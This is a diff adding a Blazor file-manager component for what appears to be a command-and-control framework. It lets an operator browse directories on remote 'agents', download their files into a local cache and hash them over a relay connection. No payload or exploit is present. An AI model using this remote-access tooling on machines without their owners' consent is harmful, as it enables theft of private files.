@@ -1,0 +1,754 @@
+@using System.Net.WebSockets
+@inherits EventSubscriber
+@inject CacheManager Cache
+@inject VfsStore Vfs
+@inject RelayConnectionService RelaySvc
+@inject AgentStore AgentDb
+@inject DownloadStore Downloads
+@inject MessageService Msg
+@inject IJSRuntime Js
+
+<div class="fp @(IsActive ? "fp-active" : "")" @onclick="Activate">
+    @* Panel header with path bar *@
+    <div class="fp-header">
+        <div class="fp-header-title">
+            <C2Icon Name="@(Mode == PanelMode.Local ? "hard-drive" : "wifi")" Size="Size.Xs"
+                    CssClass="@(Mode == PanelMode.Local ? "fp-icon-local" : "fp-icon-remote")" />
+            <span class="fp-mode-label">@(Mode == PanelMode.Local ? "LOCAL" : "REMOTE")</span>
+            @if (Mode == PanelMode.Remote && !IsConnected)
+            {
+                <span class="fp-offline-dot" title="Agent disconnected"></span>
+            }
+        </div>
+        <div class="fp-nav">
+            <C2Btn OnClick="NavigateUp" Disabled="@(loading || !CanNavigate)" Title="Up" Size="Size.Xs">
+                <C2Icon Name="arrow-up" Size="Size.Xs" />
+            </C2Btn>
+            <C2Btn OnClick="() => NavigateTo(currentPath)" Disabled="@(loading || !CanNavigate)" Title="Refresh" Size="Size.Xs">
+                <C2Icon Name="refresh" Size="Size.Xs" />
+            </C2Btn>
+            <div class="fp-path-bar">
+                <C2Input @bind-Value="currentPath" OnKeyDown="OnPathKeyDown" Monospace />
+            </div>
+        </div>
+    </div>
+
+    @* Breadcrumb *@
+    @if (pathSegments.Length > 0)
+    {
+        <div class="fp-breadcrumb">
+            <a href="javascript:void(0)" class="fp-crumb" @onclick="NavigateToRoot" @onclick:preventDefault>Root</a>
+            @for (int i = 0; i < pathSegments.Length; i++)
+            {
+                var idx = i;
+                <span class="fp-crumb-sep">/</span>
+                @if (idx == pathSegments.Length - 1)
+                {
+                    <span class="fp-crumb-active">@pathSegments[idx]</span>
+                }
+                else
+                {
+                    <a href="javascript:void(0)" class="fp-crumb" @onclick="() => NavigateToBreadcrumb(idx)" @onclick:preventDefault>@pathSegments[idx]</a>
+                }
+            }
+        </div>
+    }
+
+    @* File listing *@
+    <div class="fp-entries" @onkeydown="OnKeyDown" @onkeydown:preventDefault="true" tabindex="0" @ref="entriesRef">
+        @if (entries is not null)
+        {
+            <C2Table Hover Compact Fixed CssClass="fp-table">
+                <thead>
+                    <tr>
+                        <th class="fp-col-icon"></th>
+                        <th class="fp-col-name @SortClass("name")" @onclick='() => ToggleSort("name")'>
+                            Name @SortArrow("name")
+                        </th>
+                        <th class="fp-col-size @SortClass("size")" @onclick='() => ToggleSort("size")'>
+                            Size @SortArrow("size")
+                        </th>
+                        <th class="fp-col-modified @SortClass("modified")" @onclick='() => ToggleSort("modified")'>
+                            Modified @SortArrow("modified")
+                        </th>
+                    </tr>
+                </thead>
+                <tbody>
+                    @if (pathSegments.Length > 0)
+                    {
+                        <tr class="fp-row-parent" @onclick="NavigateUp">
+                            <td class="fp-col-icon"><C2Icon Name="arrow-up" Size="Size.Xs" /></td>
+                            <td colspan="3" class="fp-parent-label">..</td>
+                        </tr>
+                    }
+                    @{ var sorted = SortedEntries; var rowIdx = 0; }
+                    @foreach (var entry in sorted)
+                    {
+                        var e = entry;
+                        var idx = rowIdx++;
+                        var isDir = e.IsDirectory || e.IsDrive;
+                        var isSelected = selectedEntries.Contains(e);
+                        var isFocused = idx == focusIndex;
+                        <C2Tr Active="@isSelected"
+                              Dim="@(e.IsHidden || e.IsSystem)"
+                              CssClass="@($"fp-row{(isFocused ? " fp-row-focused" : "")}")"
+                              OnClick="(ev) => OnRowClick(ev, e)"
+                              OnContextMenu="(ev) => ShowContextMenu(ev, e)"
+                              PreventDefault>
+                            <td class="fp-col-icon" @ondblclick="() => OnEntryDoubleClick(e)" @ondblclick:stopPropagation="true">
+                                <C2Icon Name="@GetIcon(e)" Size="Size.Xs" CssClass="@IconClass(e)" />
+                            </td>
+                            <td class="fp-col-name" @ondblclick="() => OnEntryDoubleClick(e)" @ondblclick:stopPropagation="true">
+                                <span class="fp-name-text">@e.Name</span>
+                                @if (!isDir && Mode == PanelMode.Remote && Cache.HasDirectory)
+                                {
+                                    <FileActions Entry="e" CurrentPath="@currentPath" AgentUuid="@AgentUuid" />
+                                }
+                            </td>
+                            <td class="fp-col-size">@(isDir ? "" : Formatters.FormatSize(e.Size))</td>
+                            <td class="fp-col-modified fp-hide-narrow">@Formatters.FormatFileTime(e.LastModifiedTime)</td>
+                        </C2Tr>
+                    }
+                </tbody>
+            </C2Table>
+
+            @if (entries.Count == 0)
+            {
+                <div class="fp-empty">
+                    @if (Mode == PanelMode.Local)
+                    {
+                        @:No cached files. Download files from the remote panel.
+                    }
+                    else if (!IsConnected)
+                    {
+                        @:Agent disconnected.
+                    }
+                    else
+                    {
+                        @:Empty directory.
+                    }
+                </div>
+            }
+        }
+        else if (loading)
+        {
+            <div class="fp-loading"><C2Spinner Size="Size.Xs" /> Loading...</div>
+        }
+        else
+        {
+            <div class="fp-empty">
+                @if (Mode == PanelMode.Local)
+                {
+                    @:No cached data for this agent.
+                }
+                else
+                {
+                    @:Enter a path or connect to agent.
+                }
+            </div>
+        }
+    </div>
+
+    @* Status bar *@
+    <div class="fp-status">
+        @if (entries is not null)
+        {
+            <span class="fp-status-count">@entries.Count items</span>
+        }
+        @if (selectedEntries.Count > 0)
+        {
+            <span class="fp-status-sel">@selectedEntries.Count sel</span>
+            @if (selectedEntries.Any(e => !e.IsDirectory && !e.IsDrive))
+            {
+                var totalSize = selectedEntries.Where(e => !e.IsDirectory && !e.IsDrive).Sum(e => (long)e.Size);
+                <span class="fp-status-size">@Formatters.FormatSize((ulong)totalSize)</span>
+            }
+        }
+    </div>
+</div>
+
+@* Context menu *@
+<C2Dropdown Visible="@ctxVisible" X="@ctxX" Y="@ctxY" OnClose="HideContextMenu">
+    @if (ctxEntry is not null)
+    {
+        var isDir = ctxEntry.IsDirectory || ctxEntry.IsDrive;
+        @if (isDir)
+        {
+            <C2DropdownItem OnClick="CtxOpen"><C2Icon Name="external" Size="Size.Xs" /> Open</C2DropdownItem>
+            @if (Mode == PanelMode.Remote)
+            {
+                <C2DropdownItem OnClick="CtxSearch" Disabled="@(!IsConnected)"><C2Icon Name="search" Size="Size.Xs" /> Search</C2DropdownItem>
+            }
+            <div class="fp-ctx-sep"></div>
+            <C2DropdownItem OnClick="CtxCopyPath"><C2Icon Name="copy" Size="Size.Xs" /> Copy Path</C2DropdownItem>
+        }
+        else
+        {
+            @if (Mode == PanelMode.Remote)
+            {
+                @if (IsFileSynced(ctxEntry.Name))
+                {
+                    <C2DropdownItem OnClick="CtxView"><C2Icon Name="file-text" Size="Size.Xs" /> View</C2DropdownItem>
+                    <C2DropdownItem OnClick="CtxSaveToBrowser"><C2Icon Name="save" Size="Size.Xs" /> Save to Browser</C2DropdownItem>
+                    <div class="fp-ctx-sep"></div>
+                }
+                else
+                {
+                    <C2DropdownItem OnClick="CtxDownloadToLocal" Disabled="@(!IsConnected || !Cache.HasDirectory)"><C2Icon Name="arrow-left" Size="Size.Xs" /> Download to Local</C2DropdownItem>
+                    <div class="fp-ctx-sep"></div>
+                }
+                <C2DropdownItem OnClick="CtxHash" Disabled="@(!IsConnected)"><C2Icon Name="hash" Size="Size.Xs" /> SHA-256 Hash</C2DropdownItem>
+            }
+            else
+            {
+                <C2DropdownItem OnClick="CtxViewLocal"><C2Icon Name="file-text" Size="Size.Xs" /> View</C2DropdownItem>
+                <C2DropdownItem OnClick="CtxSaveToBrowser"><C2Icon Name="save" Size="Size.Xs" /> Save to Browser</C2DropdownItem>
+                <div class="fp-ctx-sep"></div>
+            }
+            <C2DropdownItem OnClick="CtxCopyPath"><C2Icon Name="copy" Size="Size.Xs" /> Copy Path</C2DropdownItem>
+            @if (Mode == PanelMode.Remote)
+            {
+                <C2DropdownItem OnClick="CtxSearchDir" Disabled="@(!IsConnected)"><C2Icon Name="search" Size="Size.Xs" /> Search in Directory</C2DropdownItem>
+            }
+        }
+    }
+</C2Dropdown>
+
+@code {
+    public enum PanelMode { Local, Remote }
+
+    [Parameter] public PanelMode Mode { get; set; }
+    [Parameter] public RelaySocket? Relay { get; set; }
+    [Parameter] public string? AgentId { get; set; }
+    [Parameter] public string? AgentName { get; set; }
+    [Parameter] public string? AgentUuid { get; set; }
+    [Parameter] public bool IsActive { get; set; }
+    [Parameter] public EventCallback OnActivate { get; set; }
+    [Parameter] public EventCallback<DirEntry> OnViewFile { get; set; }
+    [Parameter] public EventCallback<string> OnSearchPath { get; set; }
+    [Parameter] public EventCallback<string> OnNavigated { get; set; }
+
+    private bool IsConnected => Relay is not null && Relay.IsConnected;
+    private bool HasCache => Cache.HasDirectory && !string.IsNullOrEmpty(AgentUuid);
+    private bool CanNavigate => Mode == PanelMode.Remote ? (IsConnected || HasCache) : HasCache;
+
+    private string AgentOs
+    {
+        get
+        {
+            var os = RelaySvc.GetAllAgents()
+                .Where(a => a.Agent.Id == AgentId)
+                .Select(a => a.Agent.Os)
+                .FirstOrDefault();
+            if (string.IsNullOrEmpty(os) && !string.IsNullOrEmpty(AgentUuid))
+                os = AgentDb.GetByUuid(AgentUuid)?.Os;
+            return os ?? "";
+        }
+    }
+
+    private bool IsWindowsAgent => string.Equals(AgentOs, "Windows", StringComparison.OrdinalIgnoreCase);
+    private bool IsAndroidAgent => string.Equals(AgentOs, "Android", StringComparison.OrdinalIgnoreCase);
+    private bool IsUnixAgent => !IsWindowsAgent;
+    private string PathSep => IsUnixAgent ? "/" : @"\";
+    private string RootPath => IsWindowsAgent ? "" : IsAndroidAgent ? "/storage/emulated/0/" : "/";
+
+    // Core state
+    private string currentPath = "";
+    private string[] pathSegments = [];
+    private List<DirEntry>? entries;
+    private bool loading;
+    private bool _syncing;
+
+    // Selection state
+    private HashSet<DirEntry> selectedEntries = new();
+    private DirEntry? lastClickedEntry;
+    private int focusIndex = -1;
+
+    // Sort state
+    private string sortColumn = "name";
+    private bool sortAscending = true;
+
+    // Context menu
+    private bool ctxVisible;
+    private double ctxX, ctxY;
+    private DirEntry? ctxEntry;
+
+    private ElementReference entriesRef;
+
+    // Cached sorted list
+    private List<DirEntry>? _sortedCache;
+    private string? _sortedCacheKey;
+    private CancellationTokenSource? _refreshCts;
+
+    private List<DirEntry> SortedEntries
+    {
+        get
+        {
+            var key = $"{sortColumn}:{sortAscending}:{entries?.Count}";
+            if (_sortedCache is not null && _sortedCacheKey == key) return _sortedCache;
+            _sortedCache = ApplySort(entries ?? new());
+            _sortedCacheKey = key;
+            return _sortedCache;
+        }
+    }
+
+    private RelaySocket? _prevRelay;
+
+    // --- Public API for parent ---
+
+    public string CurrentPath => currentPath;
+    public HashSet<DirEntry> SelectedEntries => selectedEntries;
+    public List<DirEntry>? Entries => entries;
+
+    public async Task NavigateToPath(string path) => await NavigateTo(path);
+
+    // --- Lifecycle ---
+
+    protected override async Task OnParametersSetAsync()
+    {
+        if (Mode == PanelMode.Remote)
+        {
+            var relayChanged = Relay != _prevRelay && IsConnected;
+            _prevRelay = Relay;
+            if (relayChanged && entries is not null)
+            {
+                await NavigateTo(currentPath ?? RootPath);
+                return;
+            }
+        }
+
+        if (entries is not null) return;
+
+        if (Mode == PanelMode.Remote)
+        {
+            await Downloads.LoadAsync();
+            if (string.IsNullOrEmpty(currentPath)) currentPath = RootPath;
+            if (IsConnected) await NavigateTo(currentPath);
+            else if (HasCache) await NavigateFromCache(currentPath);
+        }
+        else
+        {
+            if (string.IsNullOrEmpty(currentPath)) currentPath = RootPath;
+            if (HasCache) await NavigateFromCache(currentPath);
+        }
+    }
+
+    protected override void OnInitialized()
+    {
+        On<CacheChangedEvent>(e =>
+        {
+            if (!_syncing && Cache.HasDirectory && entries is not null && Mode == PanelMode.Remote)
+                _ = SyncCacheAsync();
+        });
+        On<DownloadStoreChangedEvent>();
+        On<VfsChangedEvent>(e =>
+        {
+            if (Mode == PanelMode.Local && entries is not null)
+                ScheduleLocalRefresh();
+        });
+    }
+
+    public override void Dispose()
+    {
+        _refreshCts?.Cancel();
+        _refreshCts?.Dispose();
+        base.Dispose();
+    }
+
+    // --- Activation ---
+
+    private async Task Activate() => await OnActivate.InvokeAsync();
+
+    // --- Sorting ---
+
+    private void ToggleSort(string column)
+    {
+        if (sortColumn == column) sortAscending = !sortAscending;
+        else { sortColumn = column; sortAscending = true; }
+        InvalidateSortCache();
+    }
+
+    private void InvalidateSortCache() { _sortedCache = null; _sortedCacheKey = null; }
+
+    private List<DirEntry> ApplySort(List<DirEntry> source)
+    {
+        var dirs = source.Where(e => e.IsDirectory || e.IsDrive);
+        var files = source.Where(e => !e.IsDirectory && !e.IsDrive);
+        return SortGroup(dirs).Concat(SortGroup(files)).ToList();
+    }
+
+    private IEnumerable<DirEntry> SortGroup(IEnumerable<DirEntry> group) => sortColumn switch
+    {
+        "name" => sortAscending ? group.OrderBy(e => e.Name, StringComparer.OrdinalIgnoreCase) : group.OrderByDescending(e => e.Name, StringComparer.OrdinalIgnoreCase),
+        "size" => sortAscending ? group.OrderBy(e => e.Size) : group.OrderByDescending(e => e.Size),
+        "modified" => sortAscending ? group.OrderBy(e => e.LastModifiedTime) : group.OrderByDescending(e => e.LastModifiedTime),
+        _ => group.OrderBy(e => e.Name, StringComparer.OrdinalIgnoreCase)
+    };
+
+    private string SortClass(string column) => sortColumn == column ? "fp-col-sortable fp-sort-active" : "fp-col-sortable";
+
+    private MarkupString SortArrow(string column)
+    {
+        if (sortColumn != column) return new MarkupString("");
+        var iconName = sortAscending ? "chevron-up" : "chevron-down";
+        var svg = $"<svg class=\"c2-icon c2-icon-xs\" width=\"14\" height=\"14\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\">{C2Icon.GetPath(iconName)}</svg>";
+        return new MarkupString($"<span class=\"fp-sort-arrow\">{svg}</span>");
+    }
+
+    // --- Selection ---
+
+    private void OnRowClick(MouseEventArgs e, DirEntry entry)
+    {
+        if (e.CtrlKey || e.MetaKey)
+        {
+            if (!selectedEntries.Remove(entry)) selectedEntries.Add(entry);
+            lastClickedEntry = entry;
+        }
+        else if (e.ShiftKey && lastClickedEntry is not null)
+        {
+            var sorted = SortedEntries;
+            var startIdx = sorted.IndexOf(lastClickedEntry);
+            var endIdx = sorted.IndexOf(entry);
+            if (startIdx < 0) startIdx = 0;
+            if (startIdx > endIdx) (startIdx, endIdx) = (endIdx, startIdx);
+            selectedEntries.Clear();
+            for (int i = startIdx; i <= endIdx; i++) selectedEntries.Add(sorted[i]);
+        }
+        else
+        {
+            selectedEntries.Clear();
+            selectedEntries.Add(entry);
+            lastClickedEntry = entry;
+        }
+        focusIndex = SortedEntries.IndexOf(entry);
+    }
+
+    private async Task OnKeyDown(KeyboardEventArgs e)
+    {
+        var sorted = SortedEntries;
+        if (sorted.Count == 0) return;
+        switch (e.Key)
+        {
+            case "ArrowDown":
+                focusIndex = Math.Min(focusIndex + 1, sorted.Count - 1);
+                if (!e.ShiftKey) SelectSingle(sorted[focusIndex]); else AddToSelection(sorted[focusIndex]);
+                break;
+            case "ArrowUp":
+                focusIndex = Math.Max(focusIndex - 1, 0);
+                if (!e.ShiftKey) SelectSingle(sorted[focusIndex]); else AddToSelection(sorted[focusIndex]);
+                break;
+            case "Enter":
+                if (focusIndex >= 0 && focusIndex < sorted.Count) await OnEntryDoubleClick(sorted[focusIndex]);
+                break;
+            case "Backspace":
+                await NavigateUp();
+                break;
+            case "Escape":
+                if (ctxVisible) HideContextMenu(); else ClearSelection();
+                break;
+            case "a" when e.CtrlKey:
+                selectedEntries = new HashSet<DirEntry>(sorted);
+                break;
+        }
+    }
+
+    private void SelectSingle(DirEntry entry) { selectedEntries.Clear(); selectedEntries.Add(entry); lastClickedEntry = entry; }
+    private void AddToSelection(DirEntry entry) { selectedEntries.Add(entry); lastClickedEntry = entry; }
+    public void ClearSelection() { selectedEntries.Clear(); focusIndex = -1; }
+
+    // --- Context menu ---
+
+    private void ShowContextMenu(MouseEventArgs e, DirEntry entry)
+    {
+        if (!selectedEntries.Contains(entry)) { selectedEntries.Clear(); selectedEntries.Add(entry); lastClickedEntry = entry; }
+        ctxX = e.ClientX; ctxY = e.ClientY; ctxEntry = entry; ctxVisible = true;
+    }
+
+    private void HideContextMenu() { ctxVisible = false; ctxEntry = null; }
+
+    private async Task CtxOpen() { HideContextMenu(); if (ctxEntry is not null) await OpenAsDirectory(ctxEntry.Name); }
+
+    private void CtxSearch()
+    {
+        var name = ctxEntry?.Name; HideContextMenu();
+        if (name is not null) OnSearchPath.InvokeAsync(currentPath + name);
+    }
+
+    private async Task CtxCopyPath()
+    {
+        var name = ctxEntry?.Name; HideContextMenu();
+        if (name is null) return;
+        var fullPath = currentPath + name;
+        try { await Js.InvokeVoidAsync("navigator.clipboard.writeText", fullPath); } catch { }
+        Msg.Show($"Copied: {fullPath}", MessageType.Info, source: "File Manager");
+    }
+
+    private async Task CtxDownloadToLocal()
+    {
+        var entry = ctxEntry; HideContextMenu();
+        if (entry is not null) await EnqueueFileSync(entry);
+    }
+
+    private async Task CtxView()
+    {
+        var entry = ctxEntry; HideContextMenu();
+        if (entry is not null) await OnViewFile.InvokeAsync(entry);
+    }
+
+    private async Task CtxViewLocal()
+    {
+        var entry = ctxEntry; HideContextMenu();
+        if (entry is not null) await OnViewFile.InvokeAsync(entry);
+    }
+
+    private async Task CtxSaveToBrowser()
+    {
+        var entry = ctxEntry; HideContextMenu();
+        if (entry is null || string.IsNullOrEmpty(AgentUuid)) return;
+        var dl = Downloads.Find(AgentUuid, currentPath + entry.Name);
+        if (dl is null || dl.Status != DownloadStatus.Completed) return;
+        try
+        {
+            if (!await Cache.BlobExistsAsync(dl.CacheSubPath)) { Msg.Error("Save Failed", "File not found in local cache", "File Manager"); return; }
+            await Js.InvokeVoidAsync("c2SaveFile", dl.FileName, dl.CacheSubPath);
+        }
+        catch (Exception ex) { Msg.Error("Save Failed", $"Could not save {dl.FileName}: {ex.Message}", "File Manager"); }
+    }
+
+    private async Task CtxHash()
+    {
+        var entry = ctxEntry; HideContextMenu();
+        if (entry is null || !IsConnected) return;
+        var path = currentPath + entry.Name;
+        var payload = RelaySocket.BuildFileCommand(AgentCommands.HashFile, path, 0, 0);
+        var response = await SendCommand(payload);
+        if (response is null || response.Length < 36) return;
+        var status = RelaySocket.ReadStatus(response);
+        if (status != 0) { Msg.Error("Hash Error", $"Agent returned status {status}", "File Manager"); return; }
+        var hash = RelaySocket.ReadHash(response);
+        Msg.Show($"SHA-256: {hash}", MessageType.Success, source: "File Manager");
+    }
+
+    private void CtxSearchDir()
+    {
+        HideContextMenu();
+        OnSearchPath.InvokeAsync(FileManagerPath.TrimTrailing(currentPath));
+    }
+
+    // --- Navigation ---
+
+    private async Task NavigateTo(string path)
+    {
+        if (loading) return;
+
+        if (Mode == PanelMode.Local)
+        {
+            await NavigateFromCache(path);
+            return;
+        }
+
+        if (!IsConnected) { if (HasCache) await NavigateFromCache(path); return; }
+
+        currentPath = FileManagerPath.Normalize(path, IsUnixAgent);
+        pathSegments = FileManagerPath.GetSegments(currentPath);
+        loading = true; entries = null; ClearSelection(); InvalidateSortCache(); StateHasChanged();
+
+        try
+        {
+            var payload = RelaySocket.BuildPathCommand(AgentCommands.ListDirectory, currentPath);
+            var response = await SendCommand(payload);
+            if (response is null) return;
+            var (parsed, parseError) = DirEntry.ParseDirectoryResponse(response);
+            if (parseError is not null) { Msg.Show(parseError, MessageType.Error, source: "File Manager"); return; }
+            entries = parsed;
+            InvalidateSortCache();
+            _ = SyncCacheAsync();
+            await OnNavigated.InvokeAsync(currentPath);
+        }
+        catch (Exception ex) { Msg.Error("Browse Failed", $"Could not list directory: {ex.Message}", "File Manager"); }
+        finally { loading = false; StateHasChanged(); }
+    }
+
+    private async Task NavigateFromCache(string path)
+    {
+        if (loading || !HasCache) return;
+
+        currentPath = FileManagerPath.Normalize(path, IsUnixAgent);
+        pathSegments = FileManagerPath.GetSegments(currentPath);
+        loading = true; entries = null; ClearSelection(); InvalidateSortCache(); StateHasChanged();
+
+        try
+        {
+            var remotePath = FileManagerPath.TrimTrailing(currentPath);
+            var parentId = string.IsNullOrEmpty(remotePath) ? VfsStore.RootParentId : await Vfs.ResolveOrCreatePathAsync(AgentUuid!, remotePath);
+            var dirs = await Vfs.GetChildDirectoriesAsync(AgentUuid!, parentId);
+            var files = await Vfs.GetFilesInDirectoryAsync(AgentUuid!, parentId);
+
+            entries = new List<DirEntry>();
+            foreach (var d in dirs)
+                entries.Add(new DirEntry(Name: d.Name, CreationTime: 0, LastModifiedTime: 0, Size: 0, Type: 0, IsDirectory: true, IsDrive: d.IsDrive, IsHidden: false, IsSystem: false, IsReadOnly: false));
+            foreach (var f in files)
+                entries.Add(new DirEntry(Name: f.Name, CreationTime: 0, LastModifiedTime: 0, Size: (ulong)f.Size, Type: 0, IsDirectory: false, IsDrive: false, IsHidden: false, IsSystem: false, IsReadOnly: false));
+            InvalidateSortCache();
+            await OnNavigated.InvokeAsync(currentPath);
+        }
+        catch (Exception ex) { Msg.Error("Cache Read Failed", $"Could not load cached entries: {ex.Message}", "File Manager"); }
+        finally { loading = false; StateHasChanged(); }
+    }
+
+    private void ScheduleLocalRefresh()
+    {
+        _refreshCts?.Cancel();
+        _refreshCts = new CancellationTokenSource();
+        var token = _refreshCts.Token;
+        _ = Task.Run(async () =>
+        {
+            try
+            {
+                await Task.Delay(300, token);
+                if (!token.IsCancellationRequested) await RefreshLocal();
+            }
+            catch (TaskCanceledException) { }
+        });
+    }
+
+    private async Task RefreshLocal()
+    {
+        if (Mode != PanelMode.Local || !HasCache || loading) return;
+        await InvokeAsync(async () =>
+        {
+            try
+            {
+                var remotePath = FileManagerPath.TrimTrailing(currentPath);
+                var parentId = string.IsNullOrEmpty(remotePath) ? VfsStore.RootParentId : await Vfs.ResolveOrCreatePathAsync(AgentUuid!, remotePath);
+                var dirs = await Vfs.GetChildDirectoriesAsync(AgentUuid!, parentId);
+                var files = await Vfs.GetFilesInDirectoryAsync(AgentUuid!, parentId);
+
+                var newEntries = new List<DirEntry>();
+                foreach (var d in dirs)
+                    newEntries.Add(new DirEntry(Name: d.Name, CreationTime: 0, LastModifiedTime: 0, Size: 0, Type: 0, IsDirectory: true, IsDrive: d.IsDrive, IsHidden: false, IsSystem: false, IsReadOnly: false));
+                foreach (var f in files)
+                    newEntries.Add(new DirEntry(Name: f.Name, CreationTime: 0, LastModifiedTime: 0, Size: (ulong)f.Size, Type: 0, IsDirectory: false, IsDrive: false, IsHidden: false, IsSystem: false, IsReadOnly: false));
+
+                entries = newEntries;
+                InvalidateSortCache();
+                StateHasChanged();
+            }
+            catch { }
+        });
+    }
+
+    private async Task NavigateUp()
+    {
+        var parent = FileManagerPath.GetParent(pathSegments, PathSep, IsUnixAgent, RootPath);
+        await NavigateTo(parent);
+    }
+
+    private async Task NavigateToRoot() => await NavigateTo(RootPath);
+
+    private async Task NavigateToBreadcrumb(int index)
+    {
+        var path = FileManagerPath.BuildBreadcrumbPath(pathSegments, index, PathSep, IsUnixAgent);
+        await NavigateTo(path);
+    }
+
+    private async Task OnPathKeyDown(KeyboardEventArgs e) { if (e.Key == "Enter") await NavigateTo(currentPath); }
+    private async Task OpenAsDirectory(string name) => await NavigateTo(currentPath + name);
+
+    private async Task OnEntryDoubleClick(DirEntry entry)
+    {
+        if (entry.IsDirectory || entry.IsDrive) await OpenAsDirectory(entry.Name);
+        else await OnViewFile.InvokeAsync(entry);
+    }
+
+    // --- Download integration ---
+
+    public async Task EnqueueFileSync(DirEntry entry)
+    {
+        if (!Cache.HasDirectory || string.IsNullOrEmpty(AgentUuid)) return;
+        var remotePath = currentPath + entry.Name;
+        var parentRemotePath = FileManagerPath.TrimTrailing(currentPath);
+        var totalSize = (long)entry.Size;
+        var parentId = await Vfs.ResolveOrCreatePathAsync(AgentUuid, parentRemotePath);
+        var vfsFile = await Vfs.PutFileAsync(AgentUuid, parentId, entry.Name, remotePath.Replace('\\', '/'), totalSize);
+        var record = Downloads.Find(AgentUuid, remotePath);
+        if (record is null)
+            await Downloads.AddAsync(AgentUuid, AgentName ?? "", remotePath, entry.Name, vfsFile.Id, totalSize);
+        else if (record.Status is DownloadStatus.Completed or DownloadStatus.Failed)
+            await Downloads.RequeueAsync(record.Id, vfsFile.Id, totalSize);
+        else if (record.Status == DownloadStatus.Paused)
+            await Downloads.QueueAsync(record.Id);
+    }
+
+    public async Task EnqueueSelectedFiles()
+    {
+        var files = selectedEntries.Where(e => !e.IsDirectory && !e.IsDrive).ToList();
+        foreach (var entry in files) await EnqueueFileSync(entry);
+    }
+
+    private bool IsFileSynced(string fileName)
+        => !string.IsNullOrEmpty(AgentUuid) && Downloads.Find(AgentUuid, currentPath + fileName)?.Status == DownloadStatus.Completed;
+
+    // --- Cache sync ---
+
+    private async Task SyncCacheAsync()
+    {
+        if (_syncing || !Cache.HasDirectory || entries is null || string.IsNullOrEmpty(AgentUuid)) return;
+        var snapshot = entries.ToList();
+        var remotePath = FileManagerPath.TrimTrailing(currentPath);
+        _syncing = true;
+        try
+        {
+            var parentId = await Vfs.ResolveOrCreatePathAsync(AgentUuid, remotePath);
+            foreach (var entry in snapshot)
+            {
+                try
+                {
+                    var entryRemotePath = string.IsNullOrEmpty(remotePath) ? entry.Name : $"{remotePath}/{entry.Name}";
+                    if (entry.IsDirectory || entry.IsDrive) await Vfs.PutDirectoryAsync(AgentUuid, parentId, entry.Name, entryRemotePath, entry.IsDrive);
+                    else await Vfs.PutFileAsync(AgentUuid, parentId, entry.Name, entryRemotePath, (long)entry.Size);
+                }
+                catch { }
+            }
+            await InvokeAsync(StateHasChanged);
+        }
+        catch { }
+        finally { _syncing = false; }
+    }
+
+    // --- Icons ---
+
+    private static string GetIcon(DirEntry e)
+    {
+        if (e.IsDrive) return "hard-drive";
+        if (e.IsDirectory) return "folder";
+        var ext = System.IO.Path.GetExtension(e.Name).ToLowerInvariant();
+        return ext switch
+        {
+            ".exe" or ".dll" or ".sys" => "file-code",
+            ".txt" or ".log" or ".cfg" or ".ini" or ".conf" or ".yaml" or ".yml" or ".json" or ".xml" or ".csv" => "file-text",
+            ".zip" or ".rar" or ".7z" or ".tar" or ".gz" or ".bz2" => "package",
+            ".jpg" or ".jpeg" or ".png" or ".bmp" or ".gif" or ".ico" or ".svg" or ".webp" => "image",
+            ".pdf" => "bookmark",
+            ".mp3" or ".wav" or ".flac" or ".ogg" or ".aac" => "music",
+            ".mp4" or ".mkv" or ".avi" or ".mov" or ".wmv" => "film",
+            _ => "file"
+        };
+    }
+
+    private static string IconClass(DirEntry e)
+    {
+        if (e.IsDrive) return "fp-icon-drive";
+        if (e.IsDirectory) return "fp-icon-dir";
+        return "fp-icon-file";
+    }
+
+    // --- Agent communication ---
+
+    private async Task<byte[]?> SendCommand(byte[] payload)
+    {
+        if (Relay is null || !Relay.IsConnected) { Msg.Error("Not Connected", "No active connection to agent", "File Manager"); return null; }
+        try { return await Relay.SendAndReceive(payload); }
+        catch (Exception ex) { Msg.Error("Command Failed", $"Agent command error: {ex.Message}", "File Manager"); return null; }
+    }
+}
